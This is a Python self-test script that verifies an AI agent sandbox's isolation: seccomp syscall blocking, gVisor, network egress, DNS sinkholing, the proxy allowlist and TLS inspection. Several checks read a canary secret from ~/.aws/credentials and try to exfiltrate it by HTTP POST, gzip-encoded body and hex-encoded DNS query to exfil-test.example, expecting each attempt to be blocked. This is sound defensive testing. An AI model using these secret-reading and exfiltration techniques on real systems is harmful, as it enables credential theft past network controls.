"""In-sandbox self-test, run by ``agent-sandbox verify`` inside the agent container.

Standalone (standard library only) because it is copied into the agent image.
Each check prints one JSON line; the exit code is non-zero if any check fails.
A check that does not apply to the configuration (for example TLS inspection
checks when inspection is off) is reported as skipped.
"""

from __future__ import annotations

import argparse
import ctypes
import ctypes.util
import errno
import gzip
import http.client
import json
import os
import platform
import re
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Callable
from pathlib import Path

EPERM = errno.EPERM
TIMEOUT = 20.0
# Debian's system roots in the agent image, without the sandbox CA.
SYSTEM_BUNDLE = "/etc/ssl/certs/ca-certificates.crt"

# Syscall numbers: (x86_64, aarch64).
SYSCALLS = {
    "ptrace": (101, 117),
    "keyctl": (250, 219),
    "unshare": (272, 97),
    "mount": (165, 40),
    "bpf": (321, 280),
    "io_uring_setup": (425, 425),
    "perf_event_open": (298, 241),
    "userfaultfd": (323, 282),
    "process_vm_readv": (310, 270),
    "socket": (41, 198),
}
CLONE_NEWUSER = 0x10000000
CLONE3 = 435  # Same number on x86_64 and aarch64
AF_PACKET, SOCK_RAW = 17, 3
# gVisor reports a made-up kernel build instead of the host's; recent releases
# also end the release with "-gvisor" (e.g. "4.19.0-gvisor").
GVISOR_VERSION = re.compile(r"Linux version (\S+) #1 SMP Sun Jan 10 15:06:54 PST 2016")

# ``ok`` is None when the check does not apply to this sandbox's configuration.
Check = Callable[[argparse.Namespace], tuple[bool | None, str]]
CHECKS: list[tuple[str, Check]] = []


def check(name: str) -> Callable[[Check], Check]:
    def register(func: Check) -> Check:
        CHECKS.append((name, func))
        return func

    return register


def _status() -> dict[str, str]:
    lines = Path("/proc/self/status").read_text(encoding="ascii").splitlines()
    return dict(line.split(":\t", 1) for line in lines if ":\t" in line)


@check("runs as a non-root user")
def _non_root(_args):
    uid = os.getuid()
    return uid != 0, f"uid={uid}"


@check("no capabilities")
def _no_caps(_args):
    status = _status()
    eff, bnd = status.get("CapEff", "?").strip(), status.get("CapBnd", "?").strip()
    return int(eff, 16) == 0 and int(bnd, 16) == 0, f"CapEff={eff} CapBnd={bnd}"


@check("no_new_privs and seccomp filter active")
def _nnp_seccomp(_args):
    status = _status()
    nnp, mode = status.get("NoNewPrivs", "?").strip(), status.get("Seccomp", "?").strip()
    return nnp == "1" and mode == "2", f"NoNewPrivs={nnp} Seccomp={mode}"


@check("root filesystem is read-only")
def _read_only_root(_args):
    # gVisor checks permissions before the mount flags, so a non-root write
    # fails with EACCES there; the mount flags settle it.
    read_only = bool(os.statvfs("/").f_flag & os.ST_RDONLY)
    try:
        with open("/usr/local/.agent-sandbox-write-test", "w"):
            pass
    except OSError as exc:
        detail = os.strerror(exc.errno or 0)
        if exc.errno == errno.EROFS:
            return True, detail
        return read_only, f"{detail}, mounted {'read-only' if read_only else 'read-write'}"
    return False, "write succeeded"


@check("dangerous syscalls return EPERM")
def _syscalls(_args):
    index = {"x86_64": 0, "aarch64": 1}.get(platform.machine())
    if index is None:
        return False, f"unsupported architecture {platform.machine()}"
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    libc.syscall.restype = ctypes.c_long
    calls = {
        "ptrace": (0, 0, 0, 0),
        "keyctl": (0, -3, 1),
        "unshare": (CLONE_NEWUSER,),
        "mount": (b"none", b"/tmp", b"tmpfs", 0, None),
        "bpf": (0, None, 0),
        "io_uring_setup": (1, None),
        "perf_event_open": (None, 0, -1, -1, 0),
        "userfaultfd": (0,),
        "process_vm_readv": (os.getpid(), None, 0, None, 0, 0),
        "socket": (AF_PACKET, SOCK_RAW, 0),
    }
    allowed = []
    for name, args in calls.items():
        ctypes.set_errno(0)
        result = libc.syscall(ctypes.c_long(SYSCALLS[name][index]), *args)
        err = ctypes.get_errno()
        if result != -1 or err != EPERM:
            allowed.append(f"{name}(ret={result}, errno={err})")
    return not allowed, "all blocked" if not allowed else "not blocked: " + ", ".join(allowed)


@check("agent runs on gVisor's kernel, not the host's")
def _gvisor_kernel(args):
    if args.runtime != "runsc":
        return None, f"runtime is {args.runtime}, not runsc"
    version = Path("/proc/version").read_text(encoding="utf-8", errors="replace").strip()
    release = os.uname().release
    gvisor = bool(GVISOR_VERSION.match(version)) or release.endswith("-gvisor")
    shared = release == args.host_kernel
    detail = version + (f" (host: {args.host_kernel})" if args.host_kernel else "")
    return gvisor and not shared, detail


@check("threads start (clone3 is refused with ENOSYS)")
def _threads(_args):
    # glibc tries clone3 first and falls back to clone only on ENOSYS, which is
    # what the profile returns for clone3. A runtime that ignores the profile's
    # errnoRet (gVisor before release-20261012) returns EPERM: no thread starts.
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    ctypes.set_errno(0)
    libc.syscall(ctypes.c_long(CLONE3), None, ctypes.c_size_t(0))
    clone3 = errno.errorcode.get(ctypes.get_errno(), str(ctypes.get_errno()))
    thread = threading.Thread(target=lambda: None)
    try:
        thread.start()
    except RuntimeError as exc:
        return False, f"{exc}; clone3 failed with {clone3}"
    thread.join()
    return True, f"clone3 failed with {clone3}"


@check("no direct route to the internet")
def _no_route(_args):
    try:
        socket.create_connection(("1.1.1.1", 443), timeout=5).close()
    except OSError as exc:
        return True, exc.strerror or str(exc) or "timeout"
    return False, "connected to 1.1.1.1:443 without the proxy"


@check("host is unreachable on the sandbox network")
def _host_unreachable(args):
    for port in (22, 80, 443, 2375):
        try:
            socket.create_connection((args.host_ip, port), timeout=3).close()
        except ConnectionRefusedError:
            return False, f"{args.host_ip}:{port} answered (connection refused)"
        except OSError:
            continue
        return False, f"connected to {args.host_ip}:{port}"
    return True, f"no answer from {args.host_ip}"


@check("external DNS is sinkholed")
def _dns(_args):
    try:
        addresses = socket.getaddrinfo("example.com", 443)
    except socket.gaierror as exc:
        return True, str(exc)
    return False, f"resolved to {addresses[0][4][0]}"


def _fetch(
    url: str, data: bytes | None = None, method: str | None = None
) -> tuple[int | None, str]:
    request = urllib.request.Request(url, data=data, method=method)  # noqa: S310 - test URLs
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT) as response:  # noqa: S310
            return response.status, ""
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except (urllib.error.URLError, OSError) as exc:
        return None, str(getattr(exc, "reason", exc))


@check("allowlisted host reachable through the proxy")
def _allowed(args):
    status, detail = _fetch(f"https://{args.allowed_host}/")
    return status is not None and status < 500, f"status={status} {detail[:80]}".strip()


@check("other hosts are refused by the proxy")
def _denied(args):
    status, detail = _fetch(f"https://{args.denied_host}/")
    refused = status == 403 or "403" in detail
    return refused, f"status={status} {detail[:80]}".strip()


def _canary_secret() -> str | None:
    credentials = Path.home() / ".aws" / "credentials"
    if not credentials.exists():
        return None
    match = re.search(r"aws_secret_access_key = (\S+)", credentials.read_text(encoding="utf-8"))
    return match.group(1) if match else None


@check("canary exfiltration is blocked")
def _exfiltration(args):
    secret = _canary_secret()
    if secret is None:
        return False, "no canary found in ~/.aws/credentials"
    status, detail = _fetch(f"http://{args.allowed_host}/upload", data=f"k={secret}".encode())
    return status == 403 and "canary" in detail, f"status={status} {detail[:80]}".strip()


@check("canary in a DNS query is caught by the sinkhole")
def _dns_exfiltration(_args):
    secret = _canary_secret()
    if secret is None:
        return False, "no canary found in ~/.aws/credentials"
    encoded = secret.encode().hex()
    name = f"{encoded[:60]}.{encoded[60:]}.exfil-test.example"
    try:
        socket.getaddrinfo(name, 443)
    except socket.gaierror:
        return True, "query answered NXDOMAIN (alert expected on the host)"
    return False, "query resolved"


def _peer_issuer(host: str, cafile: str | None = None) -> str:
    """Return the organization that issued the certificate seen for ``host`` via the proxy.

    The certificate is verified against ``cafile``, or the default trust store
    (with TLS inspection, the bundle that includes the sandbox CA).
    """
    proxy = urllib.parse.urlsplit(os.environ.get("HTTPS_PROXY", ""))
    if not proxy.hostname:
        raise RuntimeError("HTTPS_PROXY is not set")
    context = ssl.create_default_context(cafile=cafile)
    connection = http.client.HTTPSConnection(
        proxy.hostname, proxy.port or 3128, timeout=TIMEOUT, context=context
    )
    connection.set_tunnel(host, 443)
    try:
        connection.connect()
        certificate = connection.sock.getpeercert()  # type: ignore[union-attr]
    finally:
        connection.close()
    issuer = dict(item[0] for item in certificate.get("issuer", ()))
    return str(issuer.get("organizationName") or issuer.get("commonName") or "?")


@check("HTTPS is re-signed by the sandbox CA (TLS inspection)")
def _tls_intercepted(args):
    if not args.tls_inspect:
        return None, "TLS inspection is off"
    issuer = _peer_issuer(args.allowed_host)
    return issuer == "agent-sandbox", f"{args.allowed_host} certificate issued by {issuer}"


@check("TLS passthrough host presents its own certificate")
def _tls_passthrough(args):
    if not args.tls_inspect:
        return None, "TLS inspection is off"
    if not args.passthrough_host:
        return None, "no inspect = false entry in network.allow"
    # Verified against the system roots alone: a certificate minted by the
    # sandbox CA would fail here.
    cafile = SYSTEM_BUNDLE if Path(SYSTEM_BUNDLE).is_file() else None
    issuer = _peer_issuer(args.passthrough_host, cafile)
    ok = issuer != "agent-sandbox"
    return ok, f"{args.passthrough_host} certificate issued by {issuer}"


@check("CA bundle is read-only and holds no private key")
def _ca_bundle(args):
    if not args.tls_inspect:
        return None, "TLS inspection is off"
    bundle = Path(os.environ.get("SSL_CERT_FILE", "/nonexistent"))
    if not bundle.is_file():
        return False, f"SSL_CERT_FILE={bundle} is missing"
    leaked = [p.name for p in bundle.parent.iterdir() if b"PRIVATE KEY" in p.read_bytes()]
    try:
        (bundle.parent / ".agent-sandbox-write-test").write_text("x", encoding="ascii")
    except OSError as exc:
        writable, reason = False, os.strerror(exc.errno or 0)
    else:
        writable, reason = True, "writable"
    ok = not leaked and not writable
    return ok, f"{bundle} {reason}" + (f", private key in {leaked}" if leaked else "")


@check("canary in an HTTPS request body is blocked")
def _https_exfiltration(args):
    if not args.tls_inspect:
        return None, "TLS inspection is off: HTTPS bodies are not visible to the gateway"
    secret = _canary_secret()
    if secret is None:
        return False, "no canary found in ~/.aws/credentials"
    status, detail = _fetch(f"https://{args.allowed_host}/upload", data=f"k={secret}".encode())
    return status == 403 and "canary" in detail, f"status={status} {detail[:80]}".strip()


@check("forbidden HTTP method is refused")
def _forbidden_method(args):
    if not args.restricted_host:
        return None, "no method rules in network.allow"
    scheme = "https" if args.tls_inspect else "http"
    url = f"{scheme}://{args.restricted_host}/"
    status, detail = _fetch(url, data=b"" if args.forbidden_method != "GET" else None,
                            method=args.forbidden_method)  # fmt: skip
    ok = status == 403 and "agent-sandbox gateway" in detail
    return ok, f"{args.forbidden_method} {url} status={status} {detail[:70]}".strip()


@check("canary in a gzip-encoded request body is blocked")
def _gzip_exfiltration(args):
    secret = _canary_secret()
    if secret is None:
        return False, "no canary found in ~/.aws/credentials"
    # Inspected HTTPS when available, plain HTTP otherwise: both decode bodies.
    scheme = "https" if args.tls_inspect else "http"
    request = urllib.request.Request(  # noqa: S310 - test URL
        f"{scheme}://{args.allowed_host}/upload",
        data=gzip.compress(f"k={secret}".encode()),
        headers={"Content-Encoding": "gzip", "Content-Type": "text/plain"},
    )
    try:
        with urllib.request.urlopen(request, timeout=TIMEOUT) as response:  # noqa: S310
            status, detail = response.status, ""
    except urllib.error.HTTPError as exc:
        status, detail = exc.code, exc.read().decode("utf-8", "replace")
    except (urllib.error.URLError, OSError) as exc:
        status, detail = None, str(getattr(exc, "reason", exc))
    ok = status == 403 and "canary" in detail
    return ok, f"{scheme} status={status} {detail[:70]}".strip()


# Node.js built-in fetch, with the outcome (and the chain of error causes,
# where undici reports the proxy's answer) printed as one JSON line.
NODE_FETCH = """
const causes = e => {
  const parts = [];
  for (let c = e; c && parts.length < 5; c = c.cause) parts.push(String(c.message || c));
  return parts.join(": ");
};
fetch(process.argv[1], {signal: AbortSignal.timeout(Number(process.argv[2]))})
  .then(r => console.log(JSON.stringify({version: process.version, status: r.status})))
  .catch(e => console.log(JSON.stringify({version: process.version, error: causes(e)})));
"""


def _node_fetch(url: str) -> dict[str, object] | None:
    """Fetch ``url`` with Node's ``fetch``; ``None`` if Node.js is not installed."""
    node = shutil.which("node")
    if node is None:
        return None
    result = subprocess.run(  # noqa: S603 - fixed argv
        [node, "-e", NODE_FETCH, url, str(int(TIMEOUT * 1000))],
        capture_output=True,
        text=True,
        timeout=TIMEOUT + 10,
    )
    lines = result.stdout.strip().splitlines()
    if not lines:
        return {"error": result.stderr.strip()[-200:] or f"exit code {result.returncode}"}
    return json.loads(lines[-1])


@check("Node.js fetch reaches an allowlisted host through the proxy")
def _node_allowed(args):
    # With TLS inspection this also proves Node trusts the sandbox CA.
    outcome = _node_fetch(f"https://{args.allowed_host}/")
    if outcome is None:
        return None, "node is not installed in the agent image"
    status = outcome.get("status")
    ok = isinstance(status, int) and status < 500
    return ok, f"node {outcome.get('version', '?')} status={status} {outcome.get('error', '')}"


@check("Node.js fetch to other hosts is refused by the proxy")
def _node_denied(args):
    outcome = _node_fetch(f"https://{args.denied_host}/")
    if outcome is None:
        return None, "node is not installed in the agent image"
    error = str(outcome.get("error", ""))
    ok = "status" not in outcome and "403" in error
    return ok, f"node {outcome.get('version', '?')} {error[:120]}".strip()


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="selftest")
    parser.add_argument("--allowed-host", default="pypi.org")
    parser.add_argument("--denied-host", default="example.com")
    parser.add_argument("--host-ip", default="172.31.250.1")
    parser.add_argument("--tls-inspect", action="store_true")
    parser.add_argument("--restricted-host", default=None)
    parser.add_argument("--forbidden-method", default="DELETE")
    parser.add_argument("--passthrough-host", default=None)
    parser.add_argument("--runtime", default="runc")
    parser.add_argument("--host-kernel", default=None, help="kernel release of the Docker host")
    args = parser.parse_args(argv)
    failed = 0
    for name, func in CHECKS:
        try:
            ok, detail = func(args)
        except Exception as exc:  # A crashing check is a failed check.
            ok, detail = False, f"{type(exc).__name__}: {exc}"
        row = {"check": name, "ok": ok is not False, "detail": detail}
        if ok is None:
            row["skipped"] = True
        failed += ok is False
        print(json.dumps(row), flush=True)
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
